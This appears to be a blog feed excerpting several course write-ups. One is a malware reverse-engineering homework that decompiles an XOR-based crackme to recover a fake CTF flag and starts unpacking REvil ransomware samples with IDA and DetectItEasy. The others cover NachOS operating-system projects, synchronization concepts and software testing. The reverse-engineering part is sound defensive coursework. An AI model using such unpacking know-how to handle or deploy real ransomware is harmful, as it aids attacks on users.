&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sub_E01EB0(std&lt;span style="color:#f92672">::&lt;/span>cin, &lt;span style="color:#f92672">&amp;amp;&lt;/span>Memory);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOBYTE(v116) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MEMORY[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v96 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xFCC1D3C4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v97 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xD8D2C8DE&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v98 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xD8D3E8E0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v99 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xD8C2EFB0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v100 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xC2ECB3C1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v101 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xB3EBE1D8&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v102 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xD5F3D8BE&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v103 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xB3EFD8DE&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v104 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xF5C2E3D5&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v105 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xFAD6D6D8&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HIBYTE(v95) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v65 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v93 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> ( v65 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">40&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v66 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>Memory;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v111 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v66 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)Memory;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v67 &lt;span style="color:#f92672">=&lt;/span> v66[v65] &lt;span style="color:#f92672">^&lt;/span> &lt;span style="color:#ae81ff">0x87&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v68 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v96 &lt;span style="color:#f92672">+&lt;/span> v65);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v94 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v67 &lt;span style="color:#f92672">!=&lt;/span> v68 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v64 &lt;span style="color:#f92672">=&lt;/span> v94;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HIBYTE(v95) &lt;span style="color:#f92672">=&lt;/span> v64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v93 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">++&lt;/span>v65;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v69 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Congratz?!&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v64 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v69 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Nope!&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>From &lt;code>v96&lt;/code> to &lt;code>v105&lt;/code>, it stored 40 bytes and it seems do something in while loop 40 times. In addition, &lt;code>v67 = v66[v65] ^ 0x87;&lt;/code> this line used &lt;code>xor&lt;/code> instruction that seems a encrypt part. And then it compared &lt;code>&amp;amp;v96 + v65&lt;/code> and &lt;code>v67&lt;/code> that encrypt the string what you input.&lt;/li>
&lt;li>If all the strings you input after process &lt;code>xor&lt;/code> to &lt;code>0x87&lt;/code> are strictly the same with &lt;code>v96&lt;/code> to &lt;code>v105&lt;/code>, then it&amp;rsquo;ll print &lt;code>Congratz?!&lt;/code>, otherwise, print &lt;code>Nope&lt;/code>.&lt;/li>
&lt;li>Used &lt;a href="https://xor.pw/#">online_xor&lt;/a> to get &lt;code>v96&lt;/code> to &lt;code>v105&lt;/code> encrypted strings.
&lt;img src="https://imgur.com/5CkTwXn.png" alt="" />
And then used &lt;a href="">online_hex2ascii&lt;/a> to get the &lt;code>CTF Flag&lt;/code>.
&lt;img src="https://imgur.com/BHA0PDT.png" alt="" />&lt;/li>
&lt;li>The answer is &lt;font color="FF0000">&lt;code>**CTF{YOU_goT_7hE_F4kE_fl49_tRY_h4RdEr_QQ}**&lt;/code>&lt;/font>, though it is not a real answer.
&lt;ul>
&lt;li>Note that, the demo from TA is finished, therefore, I still don&amp;rsquo;t know the real flag is.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="homework---upx_revilexe">
 Homework - &lt;code>upx_Revil.exe&lt;/code>
 &lt;a class="anchor" href="#homework---upx_revilexe">#&lt;/a>
&lt;/h2>
&lt;h3 id="static-analysis-observation">
 Static Analysis Observation
 &lt;a class="anchor" href="#static-analysis-observation">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Use &lt;code>IDA&lt;/code> to analyze this sample and obviously packed sample
&lt;img src="https://imgur.com/uzVMd5r.png" alt="" />&lt;/li>
&lt;li>Use the skill above then you can answer the question easily.&lt;/li>
&lt;/ul>
&lt;h2 id="homework---custom_packer_revilexe">
 Homework - &lt;code>custom_packer_Revil.exe&lt;/code>
 &lt;a class="anchor" href="#homework---custom_packer_revilexe">#&lt;/a>
&lt;/h2>
&lt;h3 id="static-analysis-observation---detectiteasy">
 Static Analysis Observation - &lt;code>DetectItEasy&lt;/code>
 &lt;a class="anchor" href="#static-analysis-observation---detectiteasy">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Though I used the tool, &lt;code>DetectItEasy&lt;/code> to check if this sample was packed or not, the answer is not quite explicit.
&lt;img src="https://imgur.com/Efv46o8.png" alt="" />&lt;/p></description></item><item><title>NTU Operating System Project 1</title><link>https://bernie6401.github.io/docs/security/course/ntu-os/ntu-operating-system-project-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-os/ntu-operating-system-project-1/</guid><description>&lt;h1 id="ntu-operating-system-project-1">
 NTU Operating System Project 1
 &lt;a class="anchor" href="#ntu-operating-system-project-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_os-operating-system-nachos-thread-management">
 tags: &lt;code>NTU_OS&lt;/code> &lt;code>Operating System&lt;/code> &lt;code>NachOS&lt;/code> &lt;code>Thread Management&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_os-operating-system-nachos-thread-management">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="how-to-parse-this-project">
 How to parse this project
 &lt;a class="anchor" href="#how-to-parse-this-project">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>You can research userkernel.cc file first. UserProgKernel will parse the command line and store the file you want to execute in execfile variable which defined at userkernel.h.
&lt;img src="https://imgur.com/n73Z19F.png" alt="parse command line" />&lt;/li>
&lt;li>Then you&amp;rsquo;ll find something interesting.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c++" data-lang="c++">&lt;span style="display:flex;">&lt;span>ForkExecute(Thread &lt;span style="color:#f92672">*&lt;/span>t)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{t&lt;span style="color:#f92672">-&amp;gt;&lt;/span>space&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Execute(t&lt;span style="color:#f92672">-&amp;gt;&lt;/span>getName());}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// space and getName() are defined at thread.h
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Execute is defined at addrspace.h
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>This is what we&amp;rsquo;ve learned on lecture that it&amp;rsquo;ll clone a child process and execute the same program as parent process just like a multi-thread.&lt;/li>
&lt;li>Next, you can observe Run() function&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c++" data-lang="c++">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>UserProgKernel&lt;span style="color:#f92672">::&lt;/span>Run()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	cout &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Total threads number is &amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> execfileNum &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> endl;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;n&lt;span style="color:#f92672">&amp;lt;=&lt;/span>execfileNum;n&lt;span style="color:#f92672">++&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		t[n] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Thread(execfile[n]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		t[n]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>space &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> AddrSpace();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		t[n]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Fork((VoidFunctionPtr) &lt;span style="color:#f92672">&amp;amp;&lt;/span>ForkExecute, (&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)t[n]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		cout &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Thread &amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> execfile[n] &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34; is executing.&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> endl;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	ThreadedKernel&lt;span style="color:#f92672">::&lt;/span>Run();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Review a very simple concept: Process Representation in Linux&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c++" data-lang="c++">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Represented by the C structure task_struct
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>pid t pid; &lt;span style="color:#75715e">/* process identifier */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> state; &lt;span style="color:#75715e">/* state of the process */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> time slice &lt;span style="color:#75715e">/* scheduling information */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">task&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">*&lt;/span>&lt;span style="color:#a6e22e">parent&lt;/span>; &lt;span style="color:#75715e">/* this process’s parent */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">list&lt;/span> head children; &lt;span style="color:#75715e">/* this process’s children */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">files&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">*&lt;/span>&lt;span style="color:#a6e22e">files&lt;/span>; &lt;span style="color:#75715e">/* list of open files */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">mm&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">*&lt;/span>&lt;span style="color:#a6e22e">mm&lt;/span>; &lt;span style="color:#75715e">/* address space of this process */&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Another related concept is &lt;strong>Process Creation&lt;/strong>
&lt;ul>
&lt;li>Address space
&lt;ul>
&lt;li>Child duplicate of parent&lt;/li>
&lt;li>Child has a program loaded into it&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>UNIX examples
&lt;ul>
&lt;li>fork() system call creates new process&lt;/li>
&lt;li>exec() system call used after a fork() to replace the process’ memory space with a new program
&lt;img src="https://imgur.com/ClBK9bA.png" alt="process creation" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>After reviewing the concept above, we can continue to answer next question(Please follow the next section -&amp;gt; Q2)&lt;/li>
&lt;/ul>
&lt;h2 id="project-qa">
 Project Q&amp;amp;A
 &lt;a class="anchor" href="#project-qa">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Q1: Why the result is not congruent with expected?
&lt;ul>
&lt;li>Because OS has multi-thread concept like the code above and it&amp;rsquo;ll fork child process. When more than 1 process be executed simultaneously without any precondition, it&amp;rsquo;ll happend what we unexpected. And the precondition or you can say the real problem in this case is context switching which is the progress between preocesses switching by CPU.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Q2: How to solve the issue?(You can include some code and explain it)
&lt;ul>
&lt;li>According to the previous question, NachOS didn&amp;rsquo;t manage memory for executing multi program and this&amp;rsquo;ll cause the current program&amp;rsquo;s page overlap to the others running program.&lt;/li>
&lt;li>Thus, we have to revise these two program and let the program&amp;rsquo;s virtual memory map to the real memory that no one used.
&lt;pre tabindex="0">&lt;code>code/userprog/addrspace.cc
code/userprog/addrspace.h
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>Add the code in addrspace.cc at the beginning to stored the usage of all physical pages and stored how many free pages can be used now.&lt;/p></description></item><item><title>NTU Operating System Project 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-os/ntu-operating-system-project-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-os/ntu-operating-system-project-2/</guid><description>&lt;h1 id="ntu-operating-system-project-2">
 NTU Operating System Project 2
 &lt;a class="anchor" href="#ntu-operating-system-project-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_os-operating-system-nachos-cpu-scheduling-system-call">
 tags: &lt;code>NTU_OS&lt;/code> &lt;code>Operating System&lt;/code> &lt;code>NachOS&lt;/code> &lt;code>CPU Scheduling&lt;/code> &lt;code>System Call&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_os-operating-system-nachos-cpu-scheduling-system-call">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="motivation">
 Motivation
 &lt;a class="anchor" href="#motivation">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>For the first task, We&amp;rsquo;d like to add sleep() function in system call that can help us call sleep in our program.&lt;/li>
&lt;li>For the second task, we&amp;rsquo;d like to implement CPU scheduling by FIFO(First-In-First-Out), SJF(Shortest-Job-First), Priority, RR(Round-Robin), and multi-level queue.&lt;/li>
&lt;/ul>
&lt;h2 id="implementation">
 Implementation
 &lt;a class="anchor" href="#implementation">#&lt;/a>
&lt;/h2>
&lt;h3 id="task1---system-call">
 Task1 - System Call
 &lt;a class="anchor" href="#task1---system-call">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>First of all, we need to define a new token, SC_Sleep, that compiler(scanner) can recognize in &lt;code>code/userprog/syscall.h&lt;/code>.&lt;/p></description></item><item><title>NTU Operating System Project 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-os/ntu-operating-system-project-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-os/ntu-operating-system-project-3/</guid><description>&lt;h1 id="ntu-operating-system-project-3">
 NTU Operating System Project 3
 &lt;a class="anchor" href="#ntu-operating-system-project-3">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_os-operating-system-nachos-memory-management">
 tags: &lt;code>NTU_OS&lt;/code> &lt;code>Operating System&lt;/code> &lt;code>NachOS&lt;/code> &lt;code>Memory Management&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_os-operating-system-nachos-memory-management">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="description-first">
 Description First
 &lt;a class="anchor" href="#description-first">#&lt;/a>
&lt;/h2>
&lt;p>I used the code from &lt;code>Project2&lt;/code> directly and obtained the correct value, 1 and 7220, by the command &lt;code>./nachos -e ../test/sort -e ../test/matmult&lt;/code> respectively. After debugging a while, I knew what&amp;rsquo;s the matter. In &lt;code>project2&lt;/code>, I set &lt;code>const unsigned int NumPhysPages = 256;&lt;/code> so that it can handle huge computing resource. In order to address this project, we must change it back to 32.&lt;/p></description></item><item><title>NTU Operating System Review Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-os/ntu-operating-system-review-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-os/ntu-operating-system-review-notes/</guid><description>&lt;h1 id="ntu-operating-system-review-notes">
 NTU Operating System Review Notes
 &lt;a class="anchor" href="#ntu-operating-system-review-notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_os-operating-system">
 tags: &lt;code>NTU_OS&lt;/code> &lt;code>Operating System&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_os-operating-system">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="ch-6-synchronization">
 Ch 6 Synchronization
 &lt;a class="anchor" href="#ch-6-synchronization">#&lt;/a>
&lt;/h2>
&lt;h3 id="process-communication">
 Process communication
 &lt;a class="anchor" href="#process-communication">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://imgur.com/zQM1oNq.png" alt="" />&lt;/p>
&lt;h4 id="race-condition">
 Race condition
 &lt;a class="anchor" href="#race-condition">#&lt;/a>
&lt;/h4>
&lt;p>就是Project1提到的共享記憶體的問題，導致multi-thread執行的結果會完全錯誤&lt;/p>
&lt;ul>
&lt;li>解決策略
&lt;ul>
&lt;li>Disable interrupt
process在對shared memory進行變數存取之前，先disable interrupt，直到完成此次存取後才enable，這樣的話這段時間，CPU就不會被其他processes搶走(preempted)&lt;/li>
&lt;li>Critical section design
必須滿足三個criteria
&lt;ul>
&lt;li>Mutual exclusion: 在任何時間點，最多只允許一個process在他自己的CS內活動，不可同時有多個process在各自的CS內活動&lt;/li>
&lt;li>Progress: 如果有人想進去CS，遲早進的去&lt;/li>
&lt;li>Bounded waiting: 在一定時間內一定進的去&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>架構圖
&lt;img src="https://imgur.com/q1iDFSC.png" alt="" />&lt;/li>
&lt;li>spinlock&lt;/li>
&lt;li>busy waiting&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h4 id="critical-section-design的方法">
 Critical section design的方法
 &lt;a class="anchor" href="#critical-section-design%e7%9a%84%e6%96%b9%e6%b3%95">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>Software solution
&lt;ul>
&lt;li>兩個processes
&lt;ul>
&lt;li>Peterson&amp;rsquo;s solution: 有turn和flag兩個變數，分別代表目前的token在誰手上(turn)，以及表示有無意願進入CS(flag)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>N個processes
&lt;ul>
&lt;li>Bakery&amp;rsquo;s ALG: 就是領號碼牌，號碼最小的人優先，若同時有多人持有相同的號碼牌，則以PID最小的優先&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Hardware 指令支援&lt;/li>
&lt;li>OS提出了mutex lock的概念，並用acquire()和release()的方法實踐&lt;/li>
&lt;li>Semaphore
&lt;ul>
&lt;li>一種可以解決CS design和processes synchronization problem的data type，會提供兩個atomic operations: wait(s)和signal(s)&lt;/li>
&lt;li>wait(s): &lt;code>while(s&amp;lt;=0) {do nothing;}s--;&lt;/code>&lt;/li>
&lt;li>signal(s): &lt;code>s++&lt;/code>&lt;/li>
&lt;li>簡單來說，s就是看現在可以使用的資源有多少(例如有多少台printer)，如果資源被分出去一個，s就減一，如果都沒有資源了，就一直等待，直到有人釋放資源，釋放資源的時候，s就會加一，所以和前面提到的mutex lock幾乎一樣，wait(s)就是acquire()，而signal(s)就是release()&lt;/li>
&lt;li>Semaphore的種類
&lt;ul>
&lt;li>有使用busy-waiting: spinlock semaphore:其實就是上面說的mutex lock和正常semaphore的概念&lt;/li>
&lt;li>沒有使用busy-waiting: Non-Busy-Waiting semaphore: 看講義&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Monitor
用來解決synchronization problem的高階資料結構
其實就是物件導向的方式，利用private、initialization等方式，創造monitor這個class object&lt;/li>
&lt;/ul>
&lt;h4 id="message-passing技術">
 Message Passing技術
 &lt;a class="anchor" href="#message-passing%e6%8a%80%e8%a1%93">#&lt;/a>
&lt;/h4>
&lt;p>&lt;img src="https://imgur.com/W7uTjET.png" alt="" />&lt;/p></description></item><item><title>NTU Software Testing Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-st/ntu-software-testing-notes-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-st/ntu-software-testing-notes-1/</guid><description>&lt;h1 id="ntu-software-testing-notes">
 NTU Software Testing Notes
 &lt;a class="anchor" href="#ntu-software-testing-notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_st-software-testing">
 tags: &lt;code>NTU_ST&lt;/code> &lt;code>Software Testing&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_st-software-testing">#&lt;/a>
&lt;/h6>
&lt;p>&lt;strong>All content in this presentation is refer to &lt;a href="http://cc.ee.ntu.edu.tw/~farn/courses/ST/2021.Spring/">Pro. Farn Wang Website&lt;/a>&lt;/strong>&lt;/p>
&lt;p>:::spoiler Click to open TOC
[TOC]
:::&lt;/p>
&lt;h2 id="61-regression-testing">
 6.1 Regression Testing
 &lt;a class="anchor" href="#61-regression-testing">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Definition
&lt;blockquote>
&lt;p>The process of re-testing software that has been modified
重複執行既有的全部或部分的相同測試 - by &lt;a href="https://medium.com/@esther.tsai/%E5%9B%9E%E6%AD%B8%E6%B8%AC%E8%A9%A6-regression-testing-35d69b996481">Esther&lt;/a>&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>Note that:
&lt;blockquote>
&lt;p>Most of our testing effort is regression testing
Regression tests must be automated&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>Type of tools
&lt;ul>
&lt;li>Capture / Replay: Capture values entered into a GUI and replay those values on new versions(抓取輸入到GUI的value並replay到新的版本)&lt;/li>
&lt;li>Version control: 追踪測試集合、預期結果、測試來源、使用的標準及其過去的有效性(Keeps track of collections of tests, expected results, where the tests came from, the criterion used, and their past effectiveness)&lt;/li>
&lt;li>Scripting software: 管理以下流程，包含獲取測試輸入、執行軟體、獲取輸出、比較結果和生成測試報告等等(Manages the process of obtaining test inputs, executing the software, obtaining the outputs, comparing the results, and generating test reports&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Tools are plentiful and cheap&lt;/p></description></item><item><title>NTU Software Testing Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-st/ntu-software-testing-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-st/ntu-software-testing-notes/</guid><description>&lt;h1 id="ntu-software-testing-notes">
 NTU Software Testing Notes
 &lt;a class="anchor" href="#ntu-software-testing-notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_st-software-testing">
 tags: &lt;code>NTU_ST&lt;/code> &lt;code>Software Testing&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_st-software-testing">#&lt;/a>
&lt;/h6>
&lt;p>&lt;strong>All content in this presentation is refer to &lt;a href="http://cc.ee.ntu.edu.tw/~farn/courses/ST/2021.Spring/">Pro. Farn Wang Website&lt;/a>&lt;/strong>&lt;/p>
&lt;p>:::spoiler Click to open TOC
[TOC]
:::&lt;/p>
&lt;h1 id="25-graph-coverage-for-specifications">
 2.5 Graph Coverage for Specifications
 &lt;a class="anchor" href="#25-graph-coverage-for-specifications">#&lt;/a>
&lt;/h1>
&lt;h2 id="design-spec">
 Design Spec.
 &lt;a class="anchor" href="#design-spec">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>What is design specification?
&lt;ul>
